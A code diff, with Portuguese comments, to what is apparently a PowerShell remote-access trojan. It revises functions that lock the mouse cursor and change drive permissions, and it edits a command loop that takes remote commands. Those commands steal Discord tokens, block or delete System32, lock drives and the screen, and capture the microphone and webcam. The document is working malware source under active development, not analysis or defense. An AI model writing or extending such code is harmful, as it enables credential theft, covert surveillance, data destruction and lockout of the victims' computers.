@@ -323,7 +323,7 @@ function Delete-System32 {
     }
 }
 
-# ===== TRAVAR DISCOS (CORRIGIDO COMPLETAMENTE) =====
+# ===== TRAVAR DISCOS =====
 function Lock-Drives {
     param([string[]]$Drives = @("C:", "D:"))
     $results = @()
@@ -353,28 +353,60 @@ function Lock-Drives {
     return "DRIVES_LOCKED:" + ($results -join ";")
 }
 
+# ===== LIBERAR DISCOS (CORRIGIDO) =====
 function Unlock-Drives {
     param([string[]]$Drives = @("C:", "D:"))
     $results = @()
     foreach ($drive in $Drives) {
         try {
-            Write-DebugLog "Destravando drive ${drive}"
+            Write-DebugLog "Liberando drive ${drive}"
             $path = "${drive}\"
             if (Test-Path $path) {
+                # Pega a ACL atual
                 $acl = Get-Acl $path
+                
+                # Remove a proteção de herança (se existir)
                 $acl.SetAccessRuleProtection($false, $true)
-                $rules = $acl.Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.AccessControlType -eq "Deny" }
-                foreach ($rule in $rules) {
-                    $acl.RemoveAccessRule($rule)
+                
+                # Encontra e remove TODAS as regras de negação para Everyone
+                $rulesToRemove = @()
+                foreach ($rule in $acl.Access) {
+                    if ($rule.IdentityReference -eq "Everyone" -and $rule.AccessControlType -eq "Deny") {
+                        $rulesToRemove += $rule
+                        Write-DebugLog "Removendo regra: $($rule.FileSystemRights)"
+                    }
                 }
+                
+                foreach ($rule in $rulesToRemove) {
+                    $acl.RemoveAccessRule($rule) | Out-Null
+                }
+                
+                # Adiciona regras de permissão total para Everyone (opcional, mas ajuda)
+                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
+                $acl.AddAccessRule($accessRule)
+                
+                # Aplica a nova ACL
                 Set-Acl $path $acl
-                $results += "${drive} destravado"
-                Write-DebugLog "Drive ${drive} destravado"
+                
+                $results += "${drive} liberado"
+                Write-DebugLog "Drive ${drive} liberado com sucesso"
+                
+                # Verifica se foi realmente liberado (teste rápido)
+                try {
+                    $testFile = "${drive}\test_permission_$(Get-Random).tmp"
+                    [System.IO.File]::WriteAllText($testFile, "test")
+                    Remove-Item $testFile -Force
+                    Write-DebugLog "Teste de escrita OK para ${drive}"
+                } catch {
+                    Write-DebugLog "Aviso: Teste de escrita falhou para ${drive}: $_"
+                }
+                
             } else {
                 $results += "${drive} não encontrado"
+                Write-DebugLog "Drive ${drive} não encontrado"
             }
         } catch {
-            Write-DebugLog "Erro ao destravar drive ${drive}: $_"
+            Write-DebugLog "Erro ao liberar drive ${drive}: $_"
             $results += "${drive} erro"
         }
     }
@@ -432,6 +464,9 @@ function Lock-Mouse {
     try {
         if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
+        Write-DebugLog "Iniciando Lock-Mouse"
+        
+        # Tenta usar ClipCursor via C#
         $cSharpCode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -468,31 +503,26 @@ public class MouseLocker {
         try {
             Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
             [MouseLocker]::Lock()
-            $script:mouseLocked = $true
-            Write-DebugLog "Mouse travado com ClipCursor"
-            return "MOUSE_LOCKED"
+            Write-DebugLog "ClipCursor aplicado com sucesso"
         } catch {
-            Write-DebugLog "Falha no ClipCursor, usando fallback: $_"
-            $script:mouseLocked = $true
-            $script:lockThread = [System.Threading.Thread]::new({
-                while ($script:mouseLocked) {
-                    try {
-                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                        Start-Sleep -Milliseconds 1
-                    } catch {}
-                }
-            })
-            $script:lockThread.IsBackground = $true
-            $script:lockThread.Start()
-            Start-Sleep -Milliseconds 10
-            if ($script:lockThread.IsAlive) {
-                Write-DebugLog "Mouse travado com fallback"
-                return "MOUSE_LOCKED"
-            } else {
-                Write-DebugLog "Fallback falhou"
-                return "MOUSE_LOCK_ERROR"
-            }
+            Write-DebugLog "Falha ao usar ClipCursor: $_"
         }
+        
+        $script:mouseLocked = $true
+        
+        $script:lockThread = [System.Threading.Thread]::new({
+            while ($script:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 1
+                } catch {}
+            }
+        })
+        $script:lockThread.IsBackground = $true
+        $script:lockThread.Start()
+        
+        Write-DebugLog "Thread de travamento iniciada"
+        return "MOUSE_LOCKED"
     } catch {
         Write-DebugLog "Erro geral em Lock-Mouse: $_"
         return "MOUSE_LOCK_ERROR"
@@ -501,16 +531,26 @@ public class MouseLocker {
 
 function Unlock-Mouse {
     try {
+        Write-DebugLog "Iniciando Unlock-Mouse"
+        
         $script:mouseLocked = $false
         
         try {
             [MouseLocker]::Unlock()
-        } catch {}
+            Write-DebugLog "ClipCursor liberado"
+        } catch {
+            Write-DebugLog "Falha ao liberar ClipCursor: $_"
+        }
         
         if ($script:lockThread -and $script:lockThread.IsAlive) {
             $script:lockThread.Abort()
+            Write-DebugLog "Thread de travamento abortada"
         }
-        Write-DebugLog "Mouse liberado"
+        
+        try {
+            [System.Windows.Forms.Cursor]::Clip = New-Object System.Drawing.Rectangle(0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+        } catch {}
+        
         return "MOUSE_UNLOCKED"
     } catch {
         Write-DebugLog "Erro ao liberar mouse: $_"
@@ -651,11 +691,9 @@ while ($true) {
                 $writer.WriteLine((Get-DiscordToken))
             } elseif ($cmd -eq "block_system32") {
                 $result = Block-System32
-                Write-DebugLog "Resultado de block_system32: $result"
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "delete_system32") {
                 $result = Delete-System32
-                Write-DebugLog "Resultado de delete_system32: $result"
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "lock_drives") {
                 $result = Lock-Drives
@@ -668,9 +706,12 @@ while ($true) {
             } elseif ($cmd -eq "unlock_screen") {
                 $writer.WriteLine((Unlock-Screen))
             } elseif ($cmd -eq "lock_mouse") {
-                $writer.WriteLine((Lock-Mouse))
+                $result = Lock-Mouse
+                Write-DebugLog "Resultado lock_mouse: $result"
+                $writer.WriteLine($result)
             } elseif ($cmd -eq "unlock_mouse") {
-                $writer.WriteLine((Unlock-Mouse))
+                $result = Unlock-Mouse
+                $writer.WriteLine($result)
             } elseif ($cmd -eq "mic") {
                 $writer.WriteLine((Get-Microphone))
             } elseif ($cmd -eq "webcam") {
@@ -720,4 +761,3 @@ while ($true) {
 
 $mutex.ReleaseMutex()
 $mutex.Dispose()
-
